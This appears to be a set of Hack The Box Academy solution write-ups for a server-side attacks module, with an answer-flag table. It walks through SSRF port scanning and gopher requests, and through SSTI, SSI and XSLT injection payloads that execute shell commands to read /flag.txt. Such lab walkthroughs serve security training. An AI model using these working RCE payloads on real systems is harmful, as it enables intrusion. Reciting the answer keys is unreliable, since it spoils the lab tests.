
| Section | Question Number | Answer |
| --- | --- | --- |
| Identifying SSRF | Question 1 | HTB{911fc5badf7d65aed95380d536c270f8} |
| Exploiting SSRF | Question 1 | HTB{61ea58507c2b9da30465b9582d6782a1} |
| Blind SSRF | Question 1 | 5000 |
| Identifying SSTI | Question 1 | Twig |
| Exploiting SSTI - Jinja2 | Question 1 | HTB{295649e25b4d852185ba34907ec80643} |
| Exploiting SSTI - Twig | Question 1 | HTB{5034a6692604de344434ae83f1cdbec6} |
| Exploiting SSI Injection | Question 1 | HTB{81e5d8e80eec8e961a31229e4a5e737e} |
| Exploiting XSLT Injection | Question 1 | HTB{3a4fe85c1f1e2b61cabe9836a150f892} |
| Server-Side Attacks - Skills Assessment | Question 1 | HTB{3b8e2b940775e0267ce39d7c80488fc8} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Identifying SSRF

## Question 1

### "Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag."

To begin, students need first to confirm the presence of an SSRF vulnerability, browsing to `http://STMIP:STMPO/`, selecting any date, and then pressing `Check Availability` while intercepting the request:

![[HTB Solutions/CBBH/z. images/32034de92ad8870c9a67eaad93950768_MD5.webp]]

Students need to open a new terminal tab and start a netcat listener:

Code: shell

```shell
nc -lvnp 8000
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ nc -lvnp 8000

listening on [any] 8000 ...
```

Then, students need to subsequently modify the URL seen in the POST request, altering it to reflect the HTTP response back to the netcat listener running on their attack host:

![[HTB Solutions/CBBH/z. images/e0108309bb1e78e0e9df956b5ab40cf2_MD5.webp]]

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ nc -lvnp 8000

UNKNOWN) [10.129.105.163] 44802
GET /ssrf HTTP/1.1
ost: 10.10.14.225:8000
Accept: */*
```

After checking the netcat listener, students will receive a connection from the server, thus confirming SSRF.

Now, students can use the SSRF vulnerability to conduct a port scan of the system to enumerate running services. To achieve this, students need to be able to infer whether a port is open (based on the response to our SSRF payload).

By supplying a port number that we assume is closed (such as `81`), the response contains an error message:

![[HTB Solutions/CBBH/z. images/74d3fa1a518c4d8896bc84405d4686c0_MD5.jpg]]

This enables students to conduct an internal port scan of the web server through the SSRF vulnerability using a fuzzing tool such as `ffuf`.

Students must first create a wordlist of the ports to scan. In this case, we'll use the first 10,000 ports:

Code: shell

```shell
seq 1 10000 > ports.txt
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ seq 1 10000 > ports.txt
```

Afterward, students may fuzz all open ports by filtering out responses containing the error message identified earlier.

Code: shell

```shell
ffuf -w ./ports.txt:FUZZ -u http://STMIP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ ffuf -w ./ports.txt:FUZZ -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"

<SNIP>
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.201.127/index.php
 :: Wordlist         : FUZZ: /home/htb-ac-594497/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Failed to connect to

________________________________________________

80                      [Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 4682ms]
3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 69ms]
8000                    [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 75ms]

:: Progress: [10000/10000] :: Job [1/1] :: 588 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```

Students will find additional web applications running on ports `80`, `3306`, and `8000`. After testing each of the available port numbers, students will find that a server-side request forgery to `http://127.0.0.1:8000` returns the flag:

![[HTB Solutions/CBBH/z. images/d656f42f18846a1663c113a5cb5596df_MD5.jpg]]

Answer: `HTB{61ea58507c2b9da30465b9582d6782a1}`

# Exploiting SSRF

## Question 1

### "Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag."

Students need to send a POST request to `/admin.php` containing the password in the `adminpw` POST parameter. However, because there is no way to send this request using the `http://` URL scheme, students need to use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket.

To achieve this, students need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded. Afterward, students need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:

Code: shell

```shell
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

However, since we are sending our URL within the HTTP POST parameter `dateserver`, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it (otherwise, we will get a `Malformed URL` error).

After URL encoding the entire gopher URL one more time, students can finally send the following request:

Code: http

```http
POST /index.php HTTP/1.1
Host: STMIP
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

![[HTB Solutions/CBBH/z. images/215e1df0670b4c19e6319f11d493a0bf_MD5.jpg]]

Answer: `HTB{61ea58507c2b9da30465b9582d6782a1}`

# Blind SSRF

## Question 1

### "Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?"

Students must create a wordlist containing the ports they intend to scan. In this case, we'll use the first 10,000 ports:

Code: shell

```shell
seq 1 10000 > ports.txt
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ seq 1 10000 > ports.txt
```

Then, students need to browse to `http://STMIP/` and select the blue `Check Availability` button, intercepting it with BurpSuite:

![[HTB Solutions/CBBH/z. images/d8a45e585b8cbe68015643d3c1f37bd6_MD5.jpg]]

Students need to first confirm the presence of an SSRF vulnerability by starting a netcat listener on their attack host:

Code: shell

```shell
nc -lvnp 8000
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ nc -lvnp 8000

listening on [any] 8000 ...
```

Then, from BurpSuite Intercept, students need to supply the URL they control as the value for `dateserver`:

Code: http

```http
POST /index.php HTTP/1.1
Host: 10.129.201.127
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.201.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://10.129.201.127
DNT: 1
Connection: close
Sec-GPC: 1

dateserver=http://PWNIP:8000/&date=2024-01-01
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ nc -lvnp 8000
  
listening on [any] 8000 ...
connect to [10.10.14.225] from (UNKNOWN) [10.129.201.127] 33608
GET / HTTP/1.1
Host: 10.10.14.225:8000
Accept: */*
```

Students need to experiment with the server, evaluating the response(s) depending on which port number is provided. When using a non-valid port, the server replies with the message `"Something went wrong!"`.

Therefore, students need to use `ffuf` to fuzz for valid ports, utilizing the known error message to filter out erroneous responses:

Code: shell

```shell
ffuf -w ./ports.txt:FUZZ -u http://STMIP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something went wrong!"
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-exnwhqyj3p]─[~]
└──╼ [★]$ ffuf -w ./ports.txt:FUZZ -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something went wrong!"

<SNIP>
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.201.127/index.php
 :: Wordlist         : FUZZ: /home/htb-ac-594497/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Something went wrong!
______________________________________________

80                      [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 4833ms]
{hidden}                    [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 81ms]
  
:: Progress: [10000/10000] :: Job [1/1] :: 588 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```

Besides port `80`, students will find port `{hidden}` to be the other valid port.

Answer: `5000`

# Identifying SSTI

## Question 1

### "Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer."

Students need to begin by browsing to `http://STMIP:SMTPO`, where they will test the various SSTI payloads:

![[HTB Solutions/CBBH/z. images/c8f44d9217ab03f5cbac0e086801477c_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/c926c217ce5ba14e63a1c370d8f06e2b_MD5.jpg]]

Now, to confirm the use of a templating engine, students need to test all the various SSTI payloads, until the templating engine can be identified:

![[HTB Solutions/CBBH/z. images/522e54900066f5e3f05682436fc137dc_MD5.jpg]]

Students must eventually follow the graphic until finally injecting the payload `{{7*'7'}}`. The result will enable students to deduce the template engine used by the web application. In Jinja, the result will be `7777777`, while in Twig, the result will be `49`:

Code: shell

```shell
{{7*'7'}}
```

![[HTB Solutions/CBBH/z. images/5684560fe8c37ea90fa577d6dbe49fa9_MD5.jpg]]

Answer: `Twig`

# Exploiting SSTI - Jinja2

## Question 1

### "Exploit the SSTI vulnerability to obtain RCE and read the flag."

Students need to begin by browsing to `http://STMIP:SMTPO`, where they will be met with a `Simple Test Server` web application containing an input box:

![[HTB Solutions/CBBH/z. images/3f98781c3a5bfc65c21e5ce211e84a60_MD5.jpg]]

After submitting the appropriate RCE payload (shown in the section's reading), students may use it to read the contents of `/flag.txt`:

Code: shell

```shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

![[HTB Solutions/CBBH/z. images/de5d14d31783a343fd562fb7fdc4a64b_MD5.jpg]]

Answer: `HTB{295649e25b4d852185ba34907ec80643}`

# Exploiting SSTI - Twig

## Question 1

### "Exploit the SSTI vulnerability to obtain RCE and read the flag."

After spawning the target machine, students will open `Firefox` and navigate to `http://STMIP:STMPO`. They will be presented with the name of the application and a name-related submission form.

![[HTB Solutions/CBBH/z. images/b81cb1e649491f8ddb280aa73b5691f7_MD5.jpg]]

Subsequently, students will proceed to list the contents of the `/` directory using Twig-related syntax:

Code: twig

```twig
{{ ['ls /'] | filter('system') }}
```

![[HTB Solutions/CBBH/z. images/0a1a89eebfca011555c7ad82e6ffd5ef_MD5.jpg]]

Students will notice that `flag.txt` is located in the root directory (`/`) and subsequently, they will navigate back to the root page (`index.php`) and utilize the `cat` command to obtain the contents of the file using Twig syntax:

Code: twig

```twig
{{ ['cat /flag.txt'] | filter('system') }}
```

![[HTB Solutions/CBBH/z. images/70bbfe1b8b3bd78c3e11262f941a06fe_MD5.jpg]]

Answer: `HTB{5034a6692604de344434ae83f1cdbec6}`

# Exploiting SSI Injection

## Question 1

### "Exploit the SSI Injection vulnerability to obtain RCE and read the flag."

Students need to begin by browsing to `http://STMIP:SMTPO`, where they will test the various SSI payloads. By providing a username of `<!--#printenv -->`, the directive is executed, and the environment variables are printed:

![[HTB Solutions/CBBH/z. images/f3243a7714f75734f842c4d52ffd1655_MD5.jpg]]

Thus, students have successfully confirmed an SSI injection vulnerability. Now, students may confirm the ability to execute arbitrary commands using the `exec` directive, by providing the following username: `<!--#exec cmd="id" -->`:

![[HTB Solutions/CBBH/z. images/52dd0c05a20960efa7d0950140931842_MD5.jpg]]

After having the server successfully inject the command, students need to utilize this technique to read the value of `/flag.txt`:

Code: shell

```shell
<!--#exec cmd="cat /flag.txt" -->
```

![[HTB Solutions/CBBH/z. images/e824e7b8a4f4fe0cc291b87e1dfd6242_MD5.jpg]]

Answer: `HTB{81e5d8e80eec8e961a31229e4a5e737e}`

# Exploiting XSLT Injection

## Question 1

### "Exploit the XSLT Injection vulnerability to obtain RCE and read the flag."

Students will find that the XSLT processor supports PHP functions, and therefore, may call the PHP `system` function to execute a command which reads the contents of the flag:

Code: shell

```shell
<xsl:value-of select="php:function('system','cat /flag.txt')" />
```

![[HTB Solutions/CBBH/z. images/ce689c3bb1d149f9d276011b9cc7b3b8_MD5.jpg]]

After students submit the query, the flag will be revealed:

![[HTB Solutions/CBBH/z. images/9b23f3c28a562ab43804b6e9d843f68c_MD5.jpg]]

Answer: `HTB{3a4fe85c1f1e2b61cabe9836a150f892}`

# Server-Side Attacks - Skills Assessment

## Question 1

### "Obtain the flag"

Students need to turn on Burp Suite, then browse to `http://STMIP:STMPO`, intercept the request and send it to Repeater (to more easily visualize the request and response):

![[HTB Solutions/CBBH/z. images/af89afc5fd4667a2f45040a9ccb24704_MD5.jpg]]

Students will notice inline Javascript, designed to retrieve the location of trucks identified by the IDs `"FusionExpress01"`, `"FusionExpress02"`, and `"FusionExpress03".` By looping through each, it creates a new `XMLHttpRequest` object is created. used to send HTTP requests and handle responses.

More specifically, a synchronous POST request is sent to the server's root endpoint (`'/'`) for each truck ID in the list. The server is expected to return the current location of each truck in JSON format. The script then updates the HTML element corresponding to each truck ID with either the truck's location or an error message if the location cannot be fetched.

In BurpSuite, students need to return to `Proxy` (where the initial request was captured) and forward the initial request. The subsequent request is a POST request to the `api=http://truckapi.htb/?id%3DFusionExpress01` endpoint:

![[HTB Solutions/CBBH/z. images/31b22239ce22941baebb3a9dbb3ec943_MD5.jpg]]

Students need to send this request to Repeater as well, and then forward it to evaluate the response:

![[HTB Solutions/CBBH/z. images/14d92289bad88a7dc76d8e55ccc1e81a_MD5.jpg]]

The query sent in the body of the POST request, `api=http://truckapi.htb/?id%3DFusionExpress01`, returns the ID of the truck, as well as the location, in JSON format.

Code: shell

```shell
{"id": "FusionExpress01", "location": "321 Maple Lane"}
```

From here, students need to test for possible server-side template injection vulnerabilities. By modifying the query with the payload `{{7*7}}`, students will confirm the server is using `Twig` as its templating engine:

Code: shell

```shell
api=http://truckapi.htb/?id%3D{{7*7}}
```

```http
HTTP/1.1 200 OK
Date: Wed, 14 Aug 2024 22:47:55 GMT
Server: Apache/2.4.59 (Debian)
Content-Length: 43
Connection: close
Content-Type: text/html; charset=UTF-8

{"id": "49", "location": "134 Main Street"}
```

With the knowledge that we are now working with `Twig`, students need to look for a way to read local files, or achieve outright remote code execution (which will then be used to read the flag.)

Therefore, students need to use the PHP built-in function `system` and pass an argument to it via Twig's `filter` function, ultimately reading the contents of the flag:

```twig
{{ ['cat /flag.txt'] | filter('system') }}
```

Additionally, students need to URL encode spaces and the pipe character, making the final payload appear as follows:

```shell
api=http://truckapi.htb/?id%3D{{%2b['cat%2b/flag.txt']%2b%7C%2bfilter('system')%2b}}
```

![[HTB Solutions/CBBH/z. images/effb58c4ff693fdf2eb691ea5b3dd956_MD5.jpg]]

Answer: `HTB{3b8e2b940775e0267ce39d7c80488fc8}`